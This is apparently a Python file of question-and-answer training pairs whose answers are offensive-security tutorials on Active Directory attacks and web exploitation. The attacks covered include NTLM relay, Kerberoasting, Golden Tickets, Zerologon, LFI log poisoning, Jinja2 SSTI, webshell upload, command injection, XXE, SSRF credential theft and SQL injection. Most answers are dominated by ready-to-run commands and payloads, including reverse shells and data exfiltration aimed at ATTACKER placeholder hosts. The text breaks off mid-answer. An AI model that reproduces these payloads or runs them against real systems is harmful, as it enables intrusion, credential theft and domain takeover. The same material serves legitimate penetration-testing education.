# === uncertainty-handling (cannot determine, unknown, additional info, adcs, http enrollment) ===
ex(
    "I have SMB access to a server. Based only on this, is the server vulnerable to ESC8?",
    """Cannot determine — SMB access alone is insufficient to assess ESC8 vulnerability.

**Why this is unknown:** ESC8 requires very specific conditions that have nothing to do with SMB:

1. **ADCS must be present** — The domain needs Active Directory Certificate Services installed
2. **HTTP enrollment endpoint must be exposed** — Specifically `http://CA-SERVER/certsrv/` (not HTTPS)
3. **The CA must not have EPA (Extended Protection for Authentication)** configured

**Additional information needed:**
- Is ADCS installed in the domain? (`certipy find` or `netexec ldap`)
- Is the HTTP enrollment endpoint accessible? (browse to `http://CA-SERVER/certsrv/`)
- Is it HTTP or HTTPS? (HTTPS mitigates relay)
- Is EPA enabled on IIS for certsrv?

**To actually check ESC8:**
```bash
# Find CA and check enrollment endpoint
certipy find -u user@domain.local -p pass -dc-ip DC-IP -text
# Look for: "HTTP Enrollment Enabled: True"

# Test directly
curl -I http://CA-SERVER/certsrv/
```

SMB access to a server tells you nothing about whether that server (or the CA) is vulnerable to ESC8 — you'd need to identify the ADCS CA server and verify HTTP enrollment is enabled."""
)

# === Bloodhound enum with neo4j ===
ex(
    "Walk me through setting up and running BloodHound from scratch on Kali.",
    """**BloodHound setup:**
```bash
# Install BloodHound and neo4j
sudo apt install bloodhound neo4j

# Start Neo4j database
sudo neo4j start
# Browser: http://localhost:7474 — set password (neo4j/neo4j → new pass)

# Launch BloodHound GUI
bloodhound &
# Login with neo4j credentials
```

**Collect data with bloodhound-python:**
```bash
pip install bloodhound

# Collect all AD data
bloodhound-python -u 'user' -p 'Password123' -d corp.local \\
  -dc 10.0.0.1 -c All --zip

# Stealthier — sessions + default
bloodhound-python -u 'user' -p 'Password123' -d corp.local \\
  -dc 10.0.0.1 -c Default
```

**Import data:**
1. Bloodhound GUI → drag-and-drop the .zip file
2. Or: Hamburger menu → Import Data

**Key queries in BloodHound:**
- "Find Shortest Paths to Domain Admins" — reveals ACL abuse paths
- "Find All Domain Admins"
- "Computers with Unconstrained Delegation"
- "Find Principals with DCSync Rights"

**What BloodHound reveals:**
- ACL paths (WriteDACL → owned → DA)
- Group memberships and nested groups
- Session information (where admins are logged in)
- Trust relationships across domains
- Neo4j Cypher queries for custom analysis

BloodHound's strength is finding multi-hop paths through ACLs that manual enumeration misses."""
)

# === Hash cracking modes (1000, 5600) ===
ex(
    "What hashcat modes do I use for Windows NTLM hashes and NTLMv2 challenge-response hashes?",
    """**NTLM hash (stored credential):**
```bash
# Mode 1000 = NTLM (stored hashes from SAM/NTDS)
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

# NTLM hash format: 32 hex chars
# Example: aad3b435b51404eeaad3b435b51404ee (empty/LM) — ignore
# Example: 31d6cfe0d16ae931b73c59d7e0c089c0 (actual NT hash)
```

**NTLMv2 challenge-response (captured from network/relay):**
```bash
# Mode 5600 = NTLMv2 (NetNTLMv2, captured with Responder)
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt

# NTLMv2 format (from Responder):
# USER::DOMAIN:CHALLENGE:NTHASH:BLOB
```

**Common hash types reference:**
| Mode | Type | Source |
|------|------|--------|
| 1000 | NTLM | SAM/NTDS/secretsdump |
| 5600 | NTLMv2 | Responder/network capture |
| 13100 | Kerberoast (TGS) | impacket-GetUserSPNs |
| 23100 | AS-REP Roast | impacket-GetNPUsers |
| 16500 | JWT HS256 | Web apps |

**Full workflow:**
```bash
# Capture NTLMv2 hashes with Responder
sudo responder -I eth0 -wF
# Crack captured hashes
hashcat -m 5600 Responder/logs/hash.txt rockyou.txt --force

# PTH with NTLM (mode 1000) — no cracking needed, use directly
impacket-wmiexec -hashes ':NTHASH' user@TARGET
```"""
)

# === misleading-smb-signing-all ===
ex(
    "If SMB signing is required on all machines in the domain, can we still use NTLM relay?",
    """SMB signing required across all machines makes SMB-to-SMB relay impossible, but relay attacks are NOT fully blocked — NTLM relay to OTHER protocols is still possible.

**What SMB signing prevents:**
- Relay from SMB → SMB (requires signing → relayed auth rejected)

**What's still possible:**
- SMB → LDAP/LDAPS relay (LDAP doesn't enforce signing by default)
- SMB → HTTP/certsrv relay (ESC8)
- SMB → MSSQL relay
- Any non-SMB target

**Still exploitable:**
```bash
# Relay to LDAP for AD operations
impacket-ntlmrelayx -t ldap://DC-IP --delegate-access -smb2support

# Relay to ADCS HTTP enrollment (ESC8)
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs -smb2support

# Relay to MSSQL
impacket-ntlmrelayx -t mssql://DB-SERVER -smb2support
```

**Summary:** SMB signing required ≠ NTLM relay dead. You can no longer relay SMB-to-SMB, but cross-protocol relay to LDAP, HTTP (ADCS), or other services is still possible as long as those targets don't require signing/EPA."""
)

# === misleading-esc8-sysvol ===
ex(
    "The attacker said SYSVOL access proves ESC8 is exploitable. Is this correct?",
    """This is incorrect — SYSVOL access and ESC8 are completely unrelated.

**ESC8** requires:
- Active Directory Certificate Services (ADCS) installed
- HTTP (not HTTPS) enrollment endpoint exposed (`/certsrv/`)
- Ability to coerce authentication (PetitPotam, PrinterBug, etc.)
- NTLM relay capability

**SYSVOL** is:
- A shared folder on all domain controllers
- Contains Group Policy Objects (GPOs), logon scripts, and policies
- Accessible to all authenticated domain users
- The classic attack against SYSVOL is finding **cleartext passwords in GPP/Group Policy Preferences** (cpassword), not NTLM relay

**SYSVOL credentials finding:**
```bash
netexec smb DC-IP -u user -p pass -M gpp_password
impacket-Get-GPPPassword domain.local/user:pass@DC-IP
```

**To verify ESC8, you need to check:**
```bash
certipy find -u user@domain.local -p pass -dc-ip DC-IP -vulnerable
# Look for: HTTP Enrollment Enabled
```

So SYSVOL access → incorrect indicator for ESC8. The attacker's claim is wrong — NTLM relay to certsrv is what matters for ESC8."""
)

# === Windows privesc service ===
ex(
    "How do you exploit a misconfigured Windows service for privilege escalation?",
    """Windows service escalation typically exploits writable service binaries or configurations.

**1. Unquoted service path (binary path has spaces, no quotes):**
```cmd
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# If path is: C:\Program Files\My App\service.exe
# Create: C:\Program.exe or C:\Program Files\My.exe
# When service restarts, Windows executes your binary first
```

**2. Writable service binary:**
```powershell
# Check service binary permissions
accesschk.exe -wuvc * 2>nul | findstr "RW Everyone"
icacls "C:\Path\To\Service.exe"

# Replace the executable with malicious payload
copy malicious.exe "C:\Path\To\Service.exe"
sc stop ServiceName; sc start ServiceName
```

**3. Writable service config (change binpath):**
```cmd
# Check service config write permissions
accesschk.exe -wuvc ServiceName

# Change the binary path to execute your command
sc config ServiceName binpath= "cmd.exe /c net localgroup administrators lowpriv /add"
sc stop ServiceName; sc start ServiceName

# Verify escalation
net localgroup administrators
```

**4. Weak service ACL (write permissions on service object):**
```powershell
# Enumerate with PowerUp.ps1
Invoke-AllChecks

# Exploit writable service
Invoke-ServiceAbuse -Name 'VulnService' -Command "net localgroup administrators lowpriv /add"
```

The key is finding a write-accessible service executable or configuration that runs as SYSTEM."""
)

# === Windows privesc svc-perms (accesschk, change binpath) ===
ex(
    "How do you find and exploit a service where you can modify the binary path (binpath)?",
    """```cmd
# Step 1: Find services with weak ACLs using accesschk
accesschk.exe /accepteula -wuvc * 2>nul
# Look for: "RW Everyone" or "RW BUILTIN\Users" on service objects

# Step 2: Verify the specific service
accesschk.exe /accepteula -ucqv VulnService
# Should show: SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS for your user

# Step 3: Check current configuration
sc qc VulnService

# Step 4: Change binpath to execute your payload
sc config VulnService binpath= "cmd.exe /c net localgroup administrators lowpriv /add"
# Note: space after = is required

# Step 5: Stop and restart the service (if you have stop/start rights)
sc stop VulnService
sc start VulnService
# Service runs as SYSTEM → executes your command as SYSTEM

# Verify:
net localgroup administrators
```

**Alternative payloads:**
```cmd
# Add admin user
sc config VulnService binpath= "cmd /c net user hacker P@ss123 /add & net localgroup administrators hacker /add"

# Execute reverse shell
sc config VulnService binpath= "C:\Users\Public\nc.exe ATTACKER-IP 4444 -e cmd.exe"
```

`accesschk` is the standard tool for checking service permissions — the `change binpath` technique works when SERVICE_CHANGE_CONFIG is granted to unprivileged users."""
)

# === LAPS (ldap, computer) ===
ex(
    "How do you enumerate and read LAPS passwords if you have the right permissions?",
    """LAPS (Local Administrator Password Solution) stores randomized local administrator passwords in AD computer objects in the `ms-Mcs-AdmPwd` attribute. If your account has read access to this attribute on a computer object, you can retrieve the local admin password.

**Enumerate LAPS-enabled computers:**
```bash
# netexec — check LAPS status on computers
netexec ldap DC-IP -u user -p pass --module laps

# Check which computer objects have LAPS attribute
netexec ldap DC-IP -u user -p pass -M laps

# impacket — LDAP query for ms-Mcs-AdmPwd
ldapsearch -x -H ldap://DC-IP -D 'user@corp.local' -w 'Pass' \\
  -b 'DC=corp,DC=local' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
```

**Read LAPS password (if you have read rights):**
```bash
# With certipy/ldap or GetADUsers equivalent
python3 laps.py -u user -p pass -d corp.local -dc-ip 10.0.0.1

# PowerShell on Windows
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | 
  Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | 
  Select-Object Name, 'ms-Mcs-AdmPwd'

# netexec output format:
# [LAPS] computer.corp.local    Administrator    PASSWORD123
```

**LDAP-based enumeration** is the key — LAPS stores passwords in AD computer object attributes. Who can read `ms-Mcs-AdmPwd` is controlled by ACLs on each computer object."""
)

# === LFI log poisoning (user-agent, access.log, rce) ===
ex(
    "How do you exploit LFI to achieve RCE through log poisoning?",
    """Log poisoning + LFI chains two vulnerabilities: inject PHP code into a server log file, then include it via LFI to execute it.

**Step 1: Confirm LFI**
```
http://target.com/page.php?file=../../../etc/passwd
# Or Windows: ?file=../../../windows/win.ini
```

**Step 2: Identify includeable log files**
```
# Apache access log
?file=../../../var/log/apache2/access.log
?file=../../../var/log/apache/access.log

# Nginx access log
?file=../../../var/log/nginx/access.log

# SSH auth log
?file=../../../var/log/auth.log
```

**Step 3: Poison the access.log via User-Agent**
```bash
# Inject PHP webshell into User-Agent header (logged in access.log)
curl -A '<?php system($_GET["cmd"]); ?>' 'http://target.com/'

# After this, access.log contains your PHP code
```

**Step 4: Execute via LFI**
```
# Include the poisoned log and pass command via GET param
http://target.com/page.php?file=../../../var/log/apache2/access.log&cmd=id

# RCE output appears in page response
# uid=www-data(www-data) gid=www-data(www-data)

# Get reverse shell
?file=../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'
```

The attack works because the web server PHP interpreter executes code found in included files — the User-Agent header value is logged verbatim to access.log, injecting your PHP payload."""
)

# === SSTI Jinja2 (__class__, __mro__, subclasses, popen, os, request) ===
ex(
    "How do you exploit SSTI in a Flask/Jinja2 application to get RCE?",
    """SSTI (Server-Side Template Injection) in Jinja2 allows code execution by injecting template expressions into user input that gets rendered server-side.

**Detection:**
```
# Basic arithmetic test
{{7*7}}  → 49 in response = Jinja2 SSTI confirmed
{{7*'7'}} → 7777777 = confirmed Jinja2 (vs Twig which shows 49)
```

**RCE Payload — Python object traversal:**
```python
# Navigate Python's MRO (Method Resolution Order) to reach OS module
# Find subprocess/Popen via __subclasses__

{{''.__class__.__mro__[1].__subclasses__()}}
# Lists all Python subclasses — find index of subprocess.Popen or os._wrap_close

# Common payload to get RCE
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}

# Alternative using request and config
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Cleaner payload
{{ ''.__class__.__mro__[1].__subclasses__() | selectattr('__name__', '==', 'Popen') | list }}
```

**Full RCE chain:**
```python
# 1. Get base class via __class__ and __mro__
{{''.__class__.__mro__[1]}}  → <class 'object'>

# 2. List all subclasses (find Popen index)
{{''.__class__.__mro__[1].__subclasses__()}}

# 3. Call Popen for command execution
{{''.__class__.__mro__[1].__subclasses__()[POPEN_INDEX]('id',shell=True,stdout=-1).communicate()[0].decode()}}

# 4. Get reverse shell
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read()}}
```

The attack chain: `__class__` → `__mro__` → `object` → `__subclasses__()` → find `subprocess.Popen` → call with OS command."""
)

# === File upload bypass (extension, mime, content-type, webshell, system, cmd) ===
ex(
    "How do you bypass file upload restrictions to upload a PHP webshell?",
    """File upload bypass techniques target client-side checks, extension blacklists, and MIME type validation.

**1. Extension bypass:**
```
# If .php is blacklisted, try alternative extensions:
.php3, .php4, .php5, .php7, .phtml, .phar
.PHP (uppercase)
.php.jpg (double extension — if only last extension checked)
.php%00.jpg (null byte — older PHP)
```

**2. MIME/Content-Type bypass:**
```http
# Change Content-Type header in Burp Suite
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=...

--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← change to image/jpeg even though it's PHP

<?php system($_GET['cmd']); ?>
--boundary--
```

**3. Magic bytes bypass (if server checks file headers):**
```bash
# Prepend GIF header to PHP webshell
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php.gif

# Or add image bytes at start
printf '\xff\xd8\xff' > shell.php  # JPEG magic bytes
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

**4. Basic PHP webshell content:**
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

**5. Execute uploaded webshell:**
```
# After upload — find the URL and trigger cmd
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?cmd=whoami

# Reverse shell
?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

Bypass checklist: try extension variations, change Content-Type header, prepend magic bytes, use double extensions."""
)

# === Command injection (semicolon, &&, sleep, ping, blind, oob, curl) ===
ex(
    "How do you detect and exploit command injection in a web application?",
    """Command injection occurs when user input is passed to OS commands without sanitization.

**Detection — test injection characters:**
```
# Append operators to test execution
; id          → semicolon separates commands
| id          → pipe operator
&& id         → AND — executes if first succeeds
`id`          → backtick execution
$(id)         → subshell
```

**URL-encoded tests:**
```
?ip=127.0.0.1; id
?ip=127.0.0.1%3B%20id
?ip=127.0.0.1|whoami
?ip=127.0.0.1 && whoami
```

**Blind command injection (no output in response):**
```bash
# Time-based detection — sleep/ping delays
; sleep 5
& ping -c 5 127.0.0.1   # Unix (5 second delay)
& ping -n 5 127.0.0.1   # Windows

# If response takes 5s longer → blind injection confirmed
```

**Out-of-Band (OOB) detection:**
```bash
# DNS OOB via Burp Collaborator or interactsh
; nslookup COLLABORATOR-URL
; curl http://COLLABORATOR-URL/$(whoami)

# Data exfiltration via DNS
; curl "http://COLLABORATOR.com/$(id | base64)"
```

**Exploit — get reverse shell:**
```bash
; bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'
; /bin/bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1

# Python
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Key operators**: semicolon (`;`), AND (`&&`), pipe (`|`) for chaining. For blind: `sleep` for time-based, `ping` for ICMP timing, `curl`/`nslookup` for OOB exfiltration."""
)

# === kerberoast (hashcat) ===
ex(
    "How do you crack a Kerberoastable hash obtained from Active Directory?",
    """Kerberoasting extracts TGS-REP tickets encrypted with service account NTLM hashes. These are crackable offline with hashcat.

**Collect TGS tickets:**
```bash
# impacket
impacket-GetUserSPNs -request corp.local/user:pass -dc-ip 10.0.0.1 -outputfile kerberoast.txt

# netexec
netexec ldap DC-IP -u user -p pass --kerberoasting kerberoast.txt
```

**Crack with hashcat:**
```bash
# Mode 13100 = Kerberos 5, etype 23, TGS-REP (RC4)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Rules for better coverage
hashcat -m 13100 kerberoast.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES-encrypted tickets (mode 19700 = etype 17, 19600 = etype 18)
hashcat -m 19700 kerberoast_aes128.txt rockyou.txt
hashcat -m 19600 kerberoast_aes256.txt rockyou.txt

# Hash format (starts with $krb5tgs$23$)
$krb5tgs$23$*svcAccount$CORP.LOCAL$...<hash>
```

**Practical notes:**
- RC4 (etype 23) → mode 13100 — easier to crack
- AES128/AES256 → modes 19700/19600 — slower to crack
- After cracking, use creds for lateral movement or privilege escalation
- Check the cracked account's group membership via BloodHound"""
)

# === petitpotam-coerce (lsarpc) ===
ex(
    "How does PetitPotam trigger NTLM authentication and what does it use?",
    """PetitPotam exploits the MS-EFSR (Encrypting File System Remote Protocol) RPC interface — specifically the `EfsRpcOpenFileRaw` function accessible via the `lsarpc` named pipe. It coerces a target host to authenticate (NTLM or Kerberos) to an attacker-controlled server.

**How it works:**
1. Attacker calls EfsRpcOpenFileRaw on the target via the `lsarpc` named pipe
2. Passes a UNC path pointing to the attacker's server
3. Target machine connects to attacker's UNC path → initiates NTLM authentication
4. Attacker captures or relays the NTLM authentication

**Usage:**
```bash
# Unauthenticated coerce (older DCs without patch)
python3 PetitPotam.py ATTACKER-IP DC-IP

# Authenticated coerce (required after MS patch)
python3 PetitPotam.py -u user -p 'Pass123' -d corp.local ATTACKER-IP DC-IP

# Force via specific interface
python3 PetitPotam.py -u user -p pass ATTACKER-IP DC-IP -pipe lsarpc
```

**Common use case — relay to ADCS (ESC8):**
```bash
# Terminal 1: Start ntlmrelayx
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

# Terminal 2: Coerce DC authentication
python3 PetitPotam.py -u '' -p '' RELAY-IP DC-IP
```

PetitPotam uses the `lsarpc` named pipe by default (also tries efsrpc and samr) to trigger forced authentication."""
)

# === ESC8 enrollment keyword ===
ex(
    "What does the ESC8 attack require from the CA configuration side?",
    """ESC8 requires the Certificate Authority (CA) to have the HTTP enrollment endpoint (Web Enrollment role service) installed and accessible over HTTP (not just HTTPS).

**Required CA configuration:**
1. **Active Directory Certificate Services (ADCS)** installed
2. **Web Enrollment** role service installed on the CA
3. **HTTP enrollment endpoint** accessible: `http://CA-SERVER/certsrv/` — must be HTTP, not HTTPS
4. No Extended Protection for Authentication (EPA) / channel binding on the IIS enrollment endpoint

**Check enrollment endpoint:**
```bash
# Test if HTTP enrollment is accessible
curl -I http://CA-SERVER/certsrv/
# Response: 401 Unauthorized (NTLM auth prompt) = endpoint exists and is HTTP

# certipy automatically detects this
certipy find -u user@corp.local -p pass -dc-ip DC-IP -text
# Output: "HTTP Enrollment Enabled: True"

# netexec
netexec ldap DC-IP -u user -p pass -M adcs
```

**Why HTTP enrollment is the attack surface:**
The IIS certsrv enrollment page uses NTLM authentication — when accessed over HTTP, there's no TLS channel for EPA/channel binding, making it vulnerable to NTLM relay. An attacker relays coerced machine authentication to this HTTP enrollment endpoint to request certificates on behalf of the victim machine."""
)

# === Zerologon fix ===  
ex(
    "What privileges does an attacker gain from Zerologon and what's the attack vector?",
    """Zerologon (CVE-2020-1472) exploits a cryptographic flaw in the Netlogon Remote Protocol (MS-NRPC) to set the machine account password of a domain controller to empty, without any credentials.

**Attack vector:** Network access to port 445 (SMB) or port 135 + dynamic RPC ports on a domain controller. No credentials required (pre-auth).

**What an attacker gains:**
1. **Reset DC machine account password to empty** — the DC$ machine account in AD now has a blank password
2. **Authenticate as the DC machine account** — impacket-secretsdump connects as DC$ with empty password
3. **Full DCSync** — dump all NTLM hashes from NTDS.dit remotely (krbtgt, all DA accounts, all users)
4. **Complete domain compromise** — use krbtgt hash for golden tickets

**Exploitation:**
```bash
# Test vulnerability
python3 zerologon_tester.py DCNAME DC-IP

# Exploit: set DC machine account password to empty
python3 cve-2020-1472-exploit.py DCNAME DC-IP

# DCSync using empty DC machine account password
impacket-secretsdump -no-pass 'domain.local/DCNAME$@DC-IP'
# OR
impacket-secretsdump domain.local/'DCNAME$'@DC-IP -just-dc

# After exploitation — RESTORE immediately or DC will fail to replicate
impacket-secretsdump -hashes ':OLD-HASH' domain.local/DCNAME$@DC-IP
```

**Impact summary:** Full domain takeover from unauthenticated network access to a domain controller via the Netlogon protocol."""
)

# === Golden ticket (ntlm hash, domain sid) ===
ex(
    "How do you create and use a Kerberos Golden Ticket after obtaining the krbtgt hash?",
    """A Golden Ticket is a forged TGT (Ticket Granting Ticket) signed with the krbtgt NTLM hash. It grants unlimited access to any service in the domain with any privileges.

**Prerequisites:**
1. krbtgt NTLM hash (from DCSync or NTDS.dit dump)
2. Domain SID (easily obtained)
3. Target username to impersonate

**Step 1: Get krbtgt hash and domain SID:**
```bash
# DCSync for krbtgt
impacket-secretsdump -just-dc-user krbtgt corp.local/admin:pass@DC-IP
# Output: krbtgt:502:aad3...:KRBTGT_NTLM_HASH:::

# Get domain SID
impacket-secretsdump corp.local/admin:pass@DC-IP | grep 'Domain SID'
# OR
python3 -c "import ldap3; ..."
# OR from lsadump::lsa /patch output in Mimikatz
```

**Step 2: Create Golden Ticket:**
```bash
# impacket - creates a .ccache ticket
impacket-ticketer -nthash KRBTGT_NTLM_HASH \\
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \\
  -domain corp.local \\
  Administrator

# Output: Administrator.ccache

# Mimikatz (on Windows)
kerberos::golden /user:Administrator /domain:corp.local \\
  /sid:S-1-5-21-... /krbtgt:NTHASH /ptt
```

**Step 3: Use the ticket:**
```bash
# Set KRB5CCNAME to use the ticket
export KRB5CCNAME=Administrator.ccache

# Access any service
impacket-wmiexec -k -no-pass corp.local/Administrator@TARGET.corp.local
impacket-psexec -k -no-pass corp.local/Administrator@TARGET.corp.local
impacket-secretsdump -k -no-pass corp.local/Administrator@DC.corp.local
```

Golden tickets require the krbtgt NTLM hash and the domain SID — both obtained via DCSync or LSASS dump."""
)

# === misleading-kerberoast-admin ===
ex(
    "I can only kerberoast domain admin accounts. Regular user accounts have no SPNs. Is this correct?",
    """This is incorrect — Kerberoasting is not limited to domain admin accounts. **Any authenticated user** can request TGS tickets for any account that has an SPN registered, regardless of the target account's privilege level.

**How Kerberoasting actually works:**
1. Any authenticated domain user can query AD for accounts with SPNs
2. Any authenticated user can request a TGS ticket for any SPN
3. The TGS is encrypted with the service account's NTLM hash
4. The requesting user can attempt to crack it offline

**The statement is wrong in two ways:**
- You CAN kerberoast low-privileged service accounts (often the most useful targets)
- Domain Admins rarely have SPNs — most SPNs belong to service accounts running SQL, IIS, Exchange, etc.
- Kerberoasting is valuable precisely because service accounts often have weak passwords

**Enumerate ALL kerberoastable accounts:**
```bash
impacket-GetUserSPNs -request corp.local/anyuser:anypass -dc-ip DC-IP
# Returns ALL accounts with SPNs, any privilege level

netexec ldap DC-IP -u user -p pass --kerberoasting output.txt
```

**High-value Kerberoast targets:**
- SQL service accounts (often have DBA privs)
- IIS/web app service accounts
- Backup service accounts
- Any service account with privileged access

The privilege requirement is only on the **requesting side** — any authenticated user can Kerberoast."""
)

# === evidence-interpretation ===
ex(
    "This BloodHound output shows a template where 'CORP\\Domain Users' has Enroll rights and CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is set. What does this mean? And what SAN fields matter?",
    """This is ESC1 — a critical AD CS misconfiguration where domain users can request certificates with arbitrary Subject Alternative Names (SAN).

**What it means:**
- `CORP\Domain Users` has **Enroll** rights → any authenticated user can request this certificate
- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag → the **enrollee supplies** the SAN in the certificate request
- Combined: any domain user can request a cert claiming to be anyone (e.g., Administrator) via the Subject Alternative Name field

**SAN fields that matter for exploitation:**
- **UPN (User Principal Name)** — `administrator@corp.local` — used for Kerberos PKINIT auth
- **DNS SAN** — `corp.local` / `DC.corp.local` — used for machine certificate auth
- The **subject alternative name** is the impersonation vector — it overrides the certificate subject for authentication

**Exploitation:**
```bash
certipy req -u lowpriv@corp.local -p 'P@ss' \\
  -ca CORP-CA -template VulnTemplate \\
  -upn administrator@corp.local \\
  -dc-ip 10.0.0.1

certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# Returns Administrator's NT hash
```

**Impact:** Full domain compromise — any domain user can become Domain Admin by obtaining a certificate with the DA's UPN in the SAN field."""
)

# === XXE (entity, oob) ===
ex(
    "How do you exploit XXE to read files and perform OOB data exfiltration?",
    """XXE (XML External Entity) injection abuses XML parsers that resolve external entities, allowing file read and SSRF.

**Basic XXE — file read:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

**Blind XXE — OOB exfiltration:**
When output isn't reflected, use out-of-band channel:
```xml
<!-- Attacker-hosted DTD: http://ATTACKER/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?data=%file;'>">
%eval;
%exfil;
```

```xml
<!-- Payload in the XXE request -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
<root><data>test</data></root>
```

**File read via parameter entity:**
```xml
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?%data;'>">
  %param1;
  %exfil;
]>
```

**SSRF via XXE:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

Key concepts: `ENTITY` declaration, `SYSTEM` keyword for external references, OOB via HTTP/DNS requests to attacker-controlled server when response isn't reflected."""
)

# === netexec null session ===
ex(
    "What does 'null session' SMB access mean and how do you check for it with netexec?",
    """A null session is an unauthenticated SMB connection — the client connects with an empty username and password. Historically this allowed extensive enumeration; on modern Windows it's restricted but sometimes still useful.

**Check with netexec:**
```bash
# Null session check (no username/password)
netexec smb TARGET-IP -u '' -p '' --shares
netexec smb TARGET-IP -u '' -p ''

# If successful output shows:
# SMB    TARGET   445    DC    [+] corp.local\ (Guest)   ← null session works!

# Enumerate shares with null session
netexec smb TARGET-IP -u '' -p '' --shares
# Lists accessible shares without credentials

# Enum users via null session
netexec smb TARGET-IP -u '' -p '' --users
netexec smb TARGET-IP -u '' -p '' --groups
```

**Impact of null sessions:**
- Enumerate domain users, groups, shares
- Potentially browse sensitive shares (SYSVOL, IPC$)
- Gather information for targeted attacks

**Other tools for null session:**
```bash
# smbclient
smbclient -L //TARGET-IP -N  # -N = no password

# rpcclient
rpcclient -U "" -N TARGET-IP
rpcclient> enumdomusers
```

Null session is relevant in environments with legacy Windows or misconfigured RestrictAnonymous settings."""
)

# === SSRF AWS metadata (accesskeyid, secretaccesskey) ===
ex(
    "How do you exploit SSRF to steal AWS credentials from the EC2 metadata service?",
    """SSRF against AWS EC2 metadata service exposes temporary IAM credentials. The metadata service listens on `169.254.169.254` (link-local address accessible only from within the instance).

**Exploit SSRF to reach metadata:**
```
# Test if SSRF works
http://target.com/fetch?url=http://169.254.169.254/

# Navigate metadata structure
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/

# Get IAM role name
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials for specific role (replace ROLE-NAME)
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
```

**Response contains temporary AWS credentials:**
```json
{
  "Code" : "Success",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "abc123...",
  "Token" : "IQoJb3Jp...",
  "Expiration" : "2024-01-01T00:00:00Z"
}
```

**Use stolen credentials:**
```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="abc123..."
export AWS_SESSION_TOKEN="IQoJb3Jp..."

# Enumerate AWS permissions
aws sts get-caller-identity
aws s3 ls
aws iam list-attached-role-policies --role-name ROLE-NAME
```

**IMDSv2 mitigation:** Token-based requests required — simple SSRF won't work against IMDSv2.
```bash
# For IMDSv2, you need a PUT request for a token first
http://target.com/fetch?url=PUT:http://169.254.169.254/latest/api/token (with X-aws-ec2-metadata-token-ttl-seconds header)
```

The key credentials are `AccessKeyId` and `SecretAccessKey` (plus Session Token for temporary creds)."""
)

# === SQLi union (order by, information_schema) ===
ex(
    "How do you enumerate a database using UNION-based SQL injection?",
    """UNION-based SQLi allows extracting data by appending results to the original query. Requires the original query's column count and data types to match your UNION.

**Step 1: Find column count with ORDER BY:**
```sql
' ORDER BY 1--    → no error
' ORDER BY 2--    → no error
' ORDER BY 3--    → error = 2 columns
```

**Step 2: Find which columns display data (using NULL/string):**
```sql
' UNION SELECT NULL,NULL--       → check for output
' UNION SELECT 'a',NULL--        → string in col 1?
' UNION SELECT NULL,'a'--        → string in col 2?
```

**Step 3: Extract database info:**
```sql
-- Database version
' UNION SELECT version(),NULL--

-- Current database name  
' UNION SELECT database(),NULL--

-- All databases
' UNION SELECT schema_name,NULL FROM information_schema.schemata--

-- Tables in current database
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- Columns in target table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT username,password FROM users--
```

**Step 4: Concatenate multiple columns (if only 1 shows):**
```sql
' UNION SELECT concat(username,':',password),NULL FROM users--
